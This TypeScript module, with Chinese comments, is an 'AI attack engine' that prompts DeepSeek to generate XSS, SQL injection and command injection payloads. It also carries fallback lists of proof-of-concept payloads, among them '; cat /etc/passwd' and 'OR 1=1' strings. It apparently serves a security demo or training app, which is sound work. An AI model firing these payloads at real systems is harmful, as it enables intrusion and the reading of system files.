/* ============================================================
   AI 攻击引擎 — DeepSeek 集成 + 内置攻击载荷
   ============================================================ */

export type AttackType = 'xss' | 'sqli' | 'command-injection' | 'dom-xss';

export type AiAttackResult = {
  payload: string;
  source: 'deepseek' | 'fallback';
};

/* ── DeepSeek 提示词配置 ── */

const XSS_SYSTEM_PROMPT = `你是一位红队安全 AI，针对 innerHTML DOM 注入漏洞生成 XSS 攻击载荷。

规则：
1. 只输出原始载荷字符串，不要解释、不要 markdown 格式
2. 载荷必须调用 alert() 来证明利用成功
3. 使用多样化的攻击向量：<script> 标签、<img onerror>、<svg onload>、<body onload> 等
4. 载荷长度不超过 200 字符
5. 每次生成不同的载荷`;

const XSS_USER_PROMPT = `生成一个针对 innerHTML 漏洞的 XSS 攻击载荷。执行时必须调用 alert()。只返回载荷字符串，不要其他内容。`;

const SQLI_SYSTEM_PROMPT = `你是一位红队安全 AI，针对数字字段的 SQL 注入漏洞生成攻击载荷。

规则：
1. 只输出原始载荷字符串，不要解释
2. 目标是绕过 ID 限制，注入点是无引号的数字字段：WHERE id = [注入点]
3. 使用经典技巧如 "1 OR 1=1"、"2 OR 1=1"、"1 UNION SELECT ..." 等
4. 不需要引号，因为注入点是数字字段
5. 每次生成不同的变体`;

const SQLI_USER_PROMPT = `生成一个针对数字 ID 字段的 SQL 注入载荷，使查询返回全部用户。注入点为：WHERE id = [输入]。只返回载荷字符串。`;

const CMDI_SYSTEM_PROMPT = `你是一位红队安全 AI，针对命令注入漏洞生成攻击载荷。

规则：
1. 只输出原始载荷字符串，不要解释
2. 使用分号、管道符、反引号等技巧注入额外命令
3. 命令目标为读取 /etc/passwd`;

const CMDI_USER_PROMPT = `生成一个命令注入载荷，通过 Ping 工具读取 /etc/passwd。只返回载荷字符串。`;

const DOM_XSS_SYSTEM_PROMPT = `你是一位红队安全 AI，针对 HTML 属性注入漏洞生成攻击载荷。

规则：
1. 只输出原始载荷字符串，不要解释
2. 注入点在 HTML 属性的引号内：<img src="[注入点]">
3. 使用单引号或双引号闭合当前属性，然后注入事件处理器
4. 使用 onerror、onload、onfocus 等事件触发 alert()
5. 每次生成不同的载荷`;

const DOM_XSS_USER_PROMPT = `生成一个针对 HTML 属性注入的攻击载荷，注入点为 <img src="USER_INPUT">。需闭合双引号并注入事件处理器触发 alert()。只返回载荷字符串。`;

/* ── 内置回退攻击载荷（API 未配置时使用） ── */

const FALLBACK_PAYLOADS: Record<AttackType, string[]> = {
  xss: [
    `<img src=x onerror="alert(1)">`,
    `<svg onload="alert(1)">`,
    `<script>alert(1)</script>`,
    `<body onload="alert(1)">`,
    `<img src=x onerror="alert('XSS')">`,
    `<details open ontoggle="alert(1)">`,
  ],
  sqli: [
    `1 OR 1=1`,
    `2 OR 1=1`,
    `1 OR 1=1 --`,
    `1 UNION SELECT 1,2,3,4`,
    `1; SELECT * FROM users`,
    `999 OR 1=1`,
  ],
  'command-injection': [
    `; cat /etc/passwd`,
    `| cat /etc/passwd`,
    `; id`,
    `| whoami`,
  ],
  'dom-xss': [
    `x" onerror="alert(1)`,
    `x" onload="alert(1)`,
    `" onfocus="alert(1)" autofocus`,
    `x" onmouseover="alert(1)`,
    `" id="avatar" onerror="alert(1)`,
  ],
};

/* ── 公开 API ── */

/**
 * 为指定漏洞类型生成攻击载荷。
 * 配置了 NEXT_PUBLIC_DEEPSEEK_API_KEY 时会调用 DeepSeek API，
 * 否则使用内置回退载荷。
 */
export async function generateAttackPayload(type: AttackType): Promise<AiAttackResult> {
  const apiKey = typeof process !== 'undefined'
    ? process.env.NEXT_PUBLIC_DEEPSEEK_API_KEY
    : undefined;

  if (apiKey) {
    try {
      const payload = await callDeepSeek(type, apiKey);
      if (payload) return { payload, source: 'deepseek' };
    } catch {
      // fall through
    }
  }

  return { payload: pickRandom(FALLBACK_PAYLOADS[type] ?? []), source: 'fallback' };
}

/* ── DeepSeek API 调用 ── */

function getPrompts(type: AttackType): { system: string; user: string } {
  switch (type) {
    case 'xss':
      return { system: XSS_SYSTEM_PROMPT, user: XSS_USER_PROMPT };
    case 'sqli':
      return { system: SQLI_SYSTEM_PROMPT, user: SQLI_USER_PROMPT };
    case 'command-injection':
      return { system: CMDI_SYSTEM_PROMPT, user: CMDI_USER_PROMPT };
    case 'dom-xss':
      return { system: DOM_XSS_SYSTEM_PROMPT, user: DOM_XSS_USER_PROMPT };
  }
}

async function callDeepSeek(type: AttackType, apiKey: string): Promise<string | null> {
  const { system, user } = getPrompts(type);

  const res = await fetch('https://api.deepseek.com/v1/chat/completions', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Authorization: `Bearer ${apiKey}`,
    },
    body: JSON.stringify({
      model: 'deepseek-chat',
      messages: [
        { role: 'system', content: system },
        { role: 'user', content: user },
      ],
      temperature: 0.8,
      max_tokens: 120,
    }),
  });

  if (!res.ok) return null;

  const json: any = await res.json();
  const raw = json?.choices?.[0]?.message?.content?.trim();
  // Strip accidental wrapping quotes / backticks
  return raw?.replace(/^["'`]|["'`]$/g, '') ?? null;
}

/* ── 工具 ── */

function pickRandom(arr: string[]): string {
  return arr[Math.floor(Math.random() * arr.length)];
}
